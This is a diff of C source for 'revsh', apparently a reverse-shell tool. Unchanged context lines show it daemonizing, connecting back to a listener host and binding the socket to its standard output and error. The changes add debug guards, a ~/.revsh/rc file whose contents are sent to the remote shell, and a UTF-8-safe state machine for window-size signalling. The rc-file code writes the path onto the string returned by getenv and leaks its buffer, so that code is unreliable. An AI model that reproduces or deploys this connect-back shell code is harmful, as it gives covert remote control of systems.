@@ -1,4 +1,6 @@
 
+//XXX Go back through and add ifdef debug checks for all the new error cases.
+
 /*******************************************************************************
  *
  * revsh
@@ -37,6 +39,8 @@
 
 #include <arpa/inet.h>
 
+#include <linux/limits.h>
+
 #include <sys/ioctl.h>
 #include <sys/socket.h>
 #include <sys/stat.h>
@@ -48,8 +52,18 @@
 
 #define WINSIZE_BUFF_LEN	16
 
+#define UTF8_HIGH	0xc2
 #define APC	0x9f
 #define ST	0x9c
+
+// state definitions
+#define NO_EVENT				0
+#define APC_HIGH_FOUND	1
+#define DATA_FOUND			2
+#define ST_HIGH_FOUND		3
+
+#define REVSH_DIR ".revsh"
+#define RC_FILE	"rc"
 
 volatile sig_atomic_t sig_found = 0;
 
@@ -392,6 +406,8 @@ int main(int argc, char **argv){
 		// - Become a daemon.
 		umask(0);
 
+
+#ifndef DEBUG
 		retval = fork();
 
 		if(retval == -1){
@@ -407,6 +423,7 @@ int main(int argc, char **argv){
 		if((retval = chdir("/")) == -1){
 			error(-1, errno, "chdir(\"/\")");
 		}
+#endif
 
 		// - Open a network connection back to a listener.
 		if((retval = getaddrinfo(argv[optind], argv[optind + 1], NULL, &result))){
@@ -442,6 +459,7 @@ int main(int argc, char **argv){
 			error(-1, errno, "close(STDOUT_FILENO)");
 		}
 
+#ifndef DEBUG
 		if((retval = close(STDERR_FILENO)) == -1){
 			error(-1, errno, "close(STDERR_FILENO)");
 		}
@@ -449,6 +467,8 @@ int main(int argc, char **argv){
 		if((retval = dup2(sock_fd, STDERR_FILENO)) == -1){
 			exit(-2);
 		}
+
+#endif
 
 		if((retval = dup2(sock_fd, STDOUT_FILENO)) == -1){
 			error(-1, errno, "dup2(%d, STDOUT_FILENO)", sock_fd);
@@ -940,12 +960,17 @@ int io_loop(int local_fd, int remote_fd, int listener){
 
 	int buff_len;
 	char *buff_head = NULL;
+	char *buff_tail = NULL;
 
 	// APC (0x9f) and ST (0x9c) are 8 bit control characters. These pointers will
 	// point to their location in a string, if found.
 	// Using APC here as start of an in-band signalling event, and ST to mark
 	// the end.
-	char *apc_ptr = NULL, *st_ptr = NULL;
+	// 
+	// EDIT: Added UTF8_HIGH to the APC and ST characters to ensure the in-band signalling can coexist with utf8 data.
+	//	We don't bother with the UTF8_HIGH parts before the io_loop() because they don't intermingle with user 
+	//	generated data at that point.
+	char *event_ptr = NULL;
 
 	struct sigaction act;
 	int current_sig;
@@ -958,6 +983,11 @@ int io_loop(int local_fd, int remote_fd, int listener){
 
 	char tmp_char;
 	int tmp_len;
+
+	int state_counter;
+
+	char *rc_file_head, *rc_file_tail;
+	int rc_file_fd;
 
 
 	if(listener){
@@ -985,6 +1015,80 @@ int io_loop(int local_fd, int remote_fd, int listener){
 	// There are four members total, but the second two are ignored.
 	winsize_buff_len = WINSIZE_BUFF_LEN;
 	winsize_buff_head = (char *) calloc(winsize_buff_len, sizeof(char));
+
+
+	// Let's add support for .revsh/rc files here! :D
+	if(listener){
+		
+		if((rc_file_head = (char *) calloc(PATH_MAX, sizeof(char))) == NULL){
+			fprintf(stderr, "%s: %d: calloc(%d, %d): %s\r\n", \
+					program_invocation_short_name, listener, PATH_MAX, (int) sizeof(char), \
+					strerror(errno));
+			retval = -1;
+			goto CLEAN_UP;
+		}
+
+		rc_file_head = getenv("HOME");
+
+		rc_file_tail = index(rc_file_head, '\0');
+		*(rc_file_tail++) = '/';	
+		sprintf(rc_file_tail, REVSH_DIR);
+		rc_file_tail = index(rc_file_head, '\0');
+		*(rc_file_tail++) = '/';	
+		sprintf(rc_file_tail, RC_FILE);
+
+
+		if((rc_file_fd = open(rc_file_head, O_RDONLY)) != -1){
+
+			while((io_bytes = read(rc_file_fd, buff_head, buff_len))){
+				if(io_bytes == -1){
+#ifdef DEBUG
+					fprintf(stderr, "%s: %d: io_loop(): read(%d, %lx, %d): %s\r\n", \
+							program_invocation_short_name, listener, \
+							rc_file_fd, (unsigned long) buff_head, buff_len, strerror(errno));
+#endif
+					retval = -1;
+					goto CLEAN_UP;
+				}
+
+				if(!io_bytes){
+#ifdef DEBUG
+					fprintf(stderr, "%s: %d: io_loop(): read(%d, %lx, %d): A OK!\r\n", \
+							program_invocation_short_name, listener, \
+							rc_file_fd, (unsigned long) buff_head, buff_len);
+#endif
+					retval = 0;
+					goto CLEAN_UP;
+				}
+
+				if((retval = write(remote_fd, buff_head, io_bytes)) == -1){
+#ifdef DEBUG
+					fprintf(stderr, "%s: %d: io_loop(): write(%d, %lx, %d): %s\r\n", \
+							program_invocation_short_name, listener, \
+							remote_fd, (unsigned long) buff_head, io_bytes, strerror(errno));
+#endif
+					goto CLEAN_UP;
+				}
+
+				if(retval != io_bytes){
+#ifdef DEBUG
+					fprintf(stderr, \
+							"%s: %d: io_loop(): write(%d, %lx, %d): %d bytes of %d written\r\n", \
+							program_invocation_short_name, listener, \
+							remote_fd, (unsigned long) buff_head, io_bytes, retval, io_bytes);
+#endif
+					retval = -1;
+					goto CLEAN_UP;
+				}
+
+			}
+
+			close(rc_file_fd);
+
+		}
+
+	}
+
 
 	// select() loop for multiplexed blocking io.
 	while(1){
@@ -1027,8 +1131,8 @@ int io_loop(int local_fd, int remote_fd, int listener){
 
 					memset(winsize_buff_head, 0, winsize_buff_len);
 					if((io_bytes = snprintf(winsize_buff_head, winsize_buff_len - 1, \
-									"%c%hd %hd%c", (char) APC, tty_winsize.ws_row, \
-									tty_winsize.ws_col, (char) ST)) < 0){
+									"%c%c%hd %hd%c%c", (char) UTF8_HIGH, (char) APC, tty_winsize.ws_row, \
+									tty_winsize.ws_col, (char) UTF8_HIGH, (char) ST)) < 0){
 #ifdef DEBUG
 						fprintf(stderr, \
 								"%s: %d: snprintf(winsize_buff_head, winsize_buff_len, \"%%c%%hd %%hd%%c\", APC, %hd, %hd, ST): %s\r\n", \
@@ -1144,12 +1248,14 @@ int io_loop(int local_fd, int remote_fd, int listener){
 				goto CLEAN_UP;
 			}
 
-			// Handle the case of in-band signal receipt.
-			if(!listener && (apc_ptr = strchr(buff_head, (char) APC))){
+			buff_tail = buff_head + io_bytes;
+
+
+			if(!listener && (event_ptr = strchr(buff_head, (char) UTF8_HIGH))){
 
 				// First, clear out any data not part of the in-band signalling
 				// that may be at the front of our buffer.
-				tmp_len = apc_ptr - buff_head;
+				tmp_len = event_ptr - buff_head;
 				if((retval = write(local_fd, buff_head, tmp_len)) == -1){
 #ifdef DEBUG
 					fprintf(stderr, "%s: %d: io_loop(): write(%d, %lx, %d): %s\r\n", \
@@ -1170,168 +1276,262 @@ int io_loop(int local_fd, int remote_fd, int listener){
 					goto CLEAN_UP;
 				}
 
-				// If the termination character is also in our buffer, setup the winsize
-				// data now.
-				if((st_ptr = strchr(buff_head, (char) ST))){
-					tmp_len = io_bytes - (st_ptr - buff_head + 1);
-					if((retval = write(local_fd, st_ptr + 1, tmp_len)) == -1){
-#ifdef DEBUG
-						fprintf(stderr, "%s: %d: io_loop(): write(%d, %lx, %d): %s\r\n", \
-								program_invocation_short_name, listener, \
-								local_fd, (unsigned long) st_ptr + 1, tmp_len, strerror(errno));
-#endif
-						goto CLEAN_UP;
-					}
+				// At this point, either buff_head is pointing to unused space or it matches event_ptr and is already UTF8_HIGH.
+				// Either way, lets put UTF8_HIGH in at buff_head[0] so we can reference it later.
+				*buff_head = (char) UTF8_HIGH;
 
-					if(retval != tmp_len){
-#ifdef DEBUG
-						fprintf(stderr, \
-								"%s: %d: io_loop(): write(%d, %lx, %d): %d bytes of %d written\r\n", \
-								program_invocation_short_name, listener, \
-								local_fd, (unsigned long) st_ptr + 1, tmp_len, retval, io_bytes);
-#endif
-						retval = -1;
-						goto CLEAN_UP;
-					}
+				// setup a state counter. Then retrieve next char from the appropriate place.
+				state_counter = APC_HIGH_FOUND;
 
-					memset(winsize_buff_head, 0, winsize_buff_len);
-					memcpy(winsize_buff_head, apc_ptr + 1, st_ptr - (apc_ptr + 1));
+				// Get winsize data structures ready
+				memset(winsize_buff_head, 0, winsize_buff_len);
+				winsize_buff_tail = winsize_buff_head;
 
-					// If the termination character is not not in our buffer, read() one
-					// char at a time until we find it.
-				}else{
-					memset(winsize_buff_head, 0, winsize_buff_len);
-					winsize_buff_tail = winsize_buff_head;
+				while(state_counter || (event_ptr != buff_tail)){
 
-					tmp_len = (buff_head + io_bytes) - (apc_ptr + 1);
-					memcpy(winsize_buff_head, apc_ptr + 1, tmp_len);
-					winsize_buff_tail += tmp_len;
+					if(event_ptr != buff_tail){
+						event_ptr++;
+						tmp_char = *event_ptr;
 
-					if((tmp_len = read(remote_fd, &tmp_char, 1)) == -1){
-#ifdef DEBUG
-						fprintf(stderr, "%s: %d: read(%d, %lx, %d): %s\r\n", \
-								program_invocation_short_name, listener, \
-								remote_fd, (unsigned long) &tmp_char, 1, strerror(errno));
-#endif
-						retval = -1;
-						goto CLEAN_UP;
-					}
+					}else{
 
-					while(tmp_char != (char) ST){
-						*(winsize_buff_tail++) = tmp_char;
-
-						if((winsize_buff_tail - winsize_buff_head) >= winsize_buff_len){
-#ifdef DEBUG
-							fprintf(stderr, "%s: %d: termios string too long.\r\n", \
-									program_invocation_short_name, listener);
-#endif
-							retval = -1;
-							goto CLEAN_UP;
-						}
-
+						// read() a char
 						if((tmp_len = read(remote_fd, &tmp_char, 1)) == -1){
 #ifdef DEBUG
 							fprintf(stderr, "%s: %d: read(%d, %lx, %d): %s\r\n", \
 									program_invocation_short_name, listener, \
-									remote_fd, (unsigned long) &tmp_char, 1, \
-									strerror(errno));
+									remote_fd, (unsigned long) &tmp_char, 1, strerror(errno));
 #endif
 							retval = -1;
 							goto CLEAN_UP;
 						}
 					}
-				}
 
-				// Should have the winsize data by this point, so consume it and 
-				// signal the foreground process group.
-				if((winsize_vec = string_to_vector(winsize_buff_head)) == NULL){
+					// now we have a char, go into the state handler
+					switch(state_counter){
+
+						// Here, we found the opening APC_HIGH, but it wasn't related to an event. Further, the buffer isn't empty.
+						// Consume the data, one char at a time, and make sure we don't find another event start.			
+						case NO_EVENT:
+
+							if(tmp_char == (char) UTF8_HIGH){
+								state_counter = APC_HIGH_FOUND;
+							}else{
+
+								if((retval = write(local_fd, &tmp_char, 1)) == -1){
 #ifdef DEBUG
-					fprintf(stderr, "%s: %d: io_loop(): string_to_vector(%s): %s\r\n", \
-							program_invocation_short_name, listener, \
-							winsize_buff_head, strerror(errno));
+									fprintf(stderr, "%s: %d: io_loop(): write(%d, %lx, %d): %s\r\n", \
+											program_invocation_short_name, listener, \
+											local_fd, (unsigned long) &tmp_char, 1, strerror(errno));
 #endif
-					retval = -1;
-					goto CLEAN_UP;
-				}
+									goto CLEAN_UP;
+								}
 
-				if(winsize_vec[0] == NULL){
+								if(retval != 1){
 #ifdef DEBUG
-					fprintf(stderr, \
-							"%s: %d: invalid initialization: tty_winsize.ws_row\r\n", \
-							program_invocation_short_name, listener);
+									fprintf(stderr, \
+											"%s: %d: io_loop(): write(%d, %lx, %d): %d bytes of %d written\r\n", \
+											program_invocation_short_name, listener, \
+											local_fd, (unsigned long) &tmp_char, 1, retval, 1);
 #endif
-					retval = -1;
-					goto CLEAN_UP;
-				}
+									retval = -1;
+									goto CLEAN_UP;
+								}
+							}
 
-				errno = 0;
-				tty_winsize.ws_row = strtol(winsize_vec[0], NULL, 10);
-				if(errno){
+							break;
+
+							// check that we are actually in an event.
+						case APC_HIGH_FOUND:
+
+							if(tmp_char == (char) APC){
+								state_counter = DATA_FOUND;
+
+							}else{
+								// damn you unicode!!!
+								state_counter = NO_EVENT;
+
+								// remember that UTF8_HIGH we stored at buff_head[0] earlier?  Yeah. :)
+								if((retval = write(local_fd, buff_head, 1)) == -1){
 #ifdef DEBUG
-					fprintf(stderr, "%s: %d: strtol(%s): %s\r\n", \
-							program_invocation_short_name, listener, \
-							winsize_vec[0], strerror(errno));
+									fprintf(stderr, "%s: %d: io_loop(): write(%d, %lx, %d): %s\r\n", \
+											program_invocation_short_name, listener, \
+											local_fd, (unsigned long) UTF8_HIGH, 1, strerror(errno));
 #endif
-					retval = -1;
-					goto CLEAN_UP;
-				}
+									goto CLEAN_UP;
+								}
 
-				if(winsize_vec[1] == NULL){
+								if(retval != 1){
 #ifdef DEBUG
-					fprintf(stderr, \
-							"%s: %d: invalid initialization: tty_winsize.ws_col\r\n", \
-							program_invocation_short_name, listener);
+									fprintf(stderr, \
+											"%s: %d: io_loop(): write(%d, %lx, %d): %d bytes of %d written\r\n", \
+											program_invocation_short_name, listener, \
+											local_fd, (unsigned long) UTF8_HIGH, 1, retval, 1);
 #endif
-					retval = -1;
-					goto CLEAN_UP;
-				}
+									retval = -1;
+									goto CLEAN_UP;
+								}
 
-				errno = 0;
-				tty_winsize.ws_col = strtol(winsize_vec[1], NULL, 10);
-				if(errno){
+								if((retval = write(local_fd, &tmp_char, 1)) == -1){
 #ifdef DEBUG
-					fprintf(stderr, "%s: %d: strtol(%s): %s\r\n", \
-							program_invocation_short_name, listener, \
-							winsize_vec[1], strerror(errno));
+									fprintf(stderr, "%s: %d: io_loop(): write(%d, %lx, %d): %s\r\n", \
+											program_invocation_short_name, listener, \
+											local_fd, (unsigned long) &tmp_char, 1, strerror(errno));
 #endif
-					retval = -1;
-					goto CLEAN_UP;
-				}
+									goto CLEAN_UP;
+								}
 
-				if((retval = ioctl(local_fd, TIOCSWINSZ, &tty_winsize)) == -1){
+								if(retval != 1){
 #ifdef DEBUG
-					fprintf(stderr, "%s: %d: ioctl(%d, %d, %lx): %s\r\n", \
-							program_invocation_short_name, listener, \
-							local_fd, TIOCGWINSZ, (unsigned long) &tty_winsize, \
-							strerror(errno));
+									fprintf(stderr, \
+											"%s: %d: io_loop(): write(%d, %lx, %d): %d bytes of %d written\r\n", \
+											program_invocation_short_name, listener, \
+											local_fd, (unsigned long) &tmp_char, 1, retval, 1);
 #endif
-					goto CLEAN_UP;
-				}
+									retval = -1;
+									goto CLEAN_UP;
+								}
+							}
 
-				if((sig_pid = tcgetsid(local_fd)) == -1){
+							break;
+
+						case DATA_FOUND:
+
+							if(tmp_char == (char) UTF8_HIGH){
+								state_counter = ST_HIGH_FOUND;
+							}else{
+								*(winsize_buff_tail++) = tmp_char;
+
+								if((winsize_buff_tail - winsize_buff_head) > winsize_buff_len){
+
+									fprintf(stderr, \
+											"%s: %d: io_loop(): switch(%d): winsize_buff overflow.\r\n", \
+											program_invocation_short_name, listener, state_counter);
+									retval = -1;
+									goto CLEAN_UP;
+								}
+							}
+							break;
+
+						case ST_HIGH_FOUND:
+
+							if(tmp_char == (char) ST){
+
+								state_counter = NO_EVENT;
+
+								// Should have the winsize data by this point, so consume it and 
+								// signal the foreground process group.
+								if((winsize_vec = string_to_vector(winsize_buff_head)) == NULL){
 #ifdef DEBUG
-					fprintf(stderr, "%s: %d: tcgetsid(%d): %s\r\n", \
-							program_invocation_short_name, listener, \
-							local_fd, strerror(errno));
+									fprintf(stderr, "%s: %d: io_loop(): string_to_vector(%s): %s\r\n", \
+											program_invocation_short_name, listener, \
+											winsize_buff_head, strerror(errno));
 #endif
-					retval = -1;
-					goto CLEAN_UP;
-				}
+									retval = -1;
+									goto CLEAN_UP;
+								}
 
-				if((retval = kill(-sig_pid, SIGWINCH)) == -1){
+								if(winsize_vec[0] == NULL){
 #ifdef DEBUG
-					fprintf(stderr, "%s: %d: kill(%d, %d): %s\r\n", \
-							program_invocation_short_name, listener, \
-							-sig_pid, SIGWINCH, strerror(errno));
+									fprintf(stderr, \
+											"%s: %d: invalid initialization: tty_winsize.ws_row\r\n", \
+											program_invocation_short_name, listener);
 #endif
-					goto CLEAN_UP;
-				}
-			}
+									retval = -1;
+									goto CLEAN_UP;
+								}
 
-			if(apc_ptr){
-				apc_ptr = NULL;
-				st_ptr = NULL;
+								errno = 0;
+								tty_winsize.ws_row = (short) strtol(winsize_vec[0], NULL, 10);
+								if(errno){
+#ifdef DEBUG
+									fprintf(stderr, "%s: %d: strtol(%s): %s\r\n", \
+											program_invocation_short_name, listener, \
+											winsize_vec[0], strerror(errno));
+#endif
+									retval = -1;
+									goto CLEAN_UP;
+								}
+
+								if(winsize_vec[1] == NULL){
+#ifdef DEBUG
+									fprintf(stderr, \
+											"%s: %d: invalid initialization: tty_winsize.ws_col\r\n", \
+											program_invocation_short_name, listener);
+#endif
+									retval = -1;
+									goto CLEAN_UP;
+								}
+
+								errno = 0;
+								tty_winsize.ws_col = (short) strtol(winsize_vec[1], NULL, 10);
+								if(errno){
+#ifdef DEBUG
+									fprintf(stderr, "%s: %d: strtol(%s): %s\r\n", \
+											program_invocation_short_name, listener, \
+											winsize_vec[1], strerror(errno));
+#endif
+									retval = -1;
+									goto CLEAN_UP;
+								}
+
+								if((retval = ioctl(local_fd, TIOCSWINSZ, &tty_winsize)) == -1){
+#ifdef DEBUG
+									fprintf(stderr, "%s: %d: ioctl(%d, %d, %lx): %s\r\n", \
+											program_invocation_short_name, listener, \
+											local_fd, TIOCGWINSZ, (unsigned long) &tty_winsize, \
+											strerror(errno));
+#endif
+									goto CLEAN_UP;
+								}
+
+								if((sig_pid = tcgetsid(local_fd)) == -1){
+#ifdef DEBUG
+									fprintf(stderr, "%s: %d: tcgetsid(%d): %s\r\n", \
+											program_invocation_short_name, listener, \
+											local_fd, strerror(errno));
+#endif
+									retval = -1;
+									goto CLEAN_UP;
+								}
+
+								if((retval = kill(-sig_pid, SIGWINCH)) == -1){
+#ifdef DEBUG
+									fprintf(stderr, "%s: %d: kill(%d, %d): %s\r\n", \
+											program_invocation_short_name, listener, \
+											-sig_pid, SIGWINCH, strerror(errno));
+#endif
+									goto CLEAN_UP;
+								}
+
+							}else{
+								// The winsize data is encoded as ascii. It should never come across at UTF8_HIGH.
+								// So this case will always be an error. Handle as such.
+								fprintf(stderr, \
+										"%s: %d: io_loop(): switch(%d): high closing byte found w/out low closing byte. Should not be here!\r\n", \
+										program_invocation_short_name, listener, state_counter);
+								retval = -1;
+								goto CLEAN_UP;
+							}
+
+							break;
+
+						default:
+
+							// Handle error case.
+							fprintf(stderr, \
+									"%s: %d: io_loop(): switch(%d): unknown state. Should not be here!\r\n", \
+									program_invocation_short_name, listener, state_counter);
+							retval = -1;
+							goto CLEAN_UP;
+
+					}
+
+				}
+
 			}else{
+
+				// Don't forget to write output for the normal case!
 				if((retval = write(local_fd, buff_head, io_bytes)) == -1){
 #ifdef DEBUG
 					fprintf(stderr, "%s: %d: io_loop(): write(%d, %lx, %d): %s\r\n", \
@@ -1351,10 +1551,10 @@ int io_loop(int local_fd, int remote_fd, int listener){
 					retval = -1;
 					goto CLEAN_UP;
 				}
+
 			}
 		}
 	}
-
 #ifdef DEBUG
 	fprintf(stderr, "%s: %d: io_loop(): while(1): Shouldn't ever be here.\r\n", \
 			program_invocation_short_name, listener);
@@ -1365,4 +1565,3 @@ CLEAN_UP:
 	free(buff_head);
 	return(retval);
 }
-
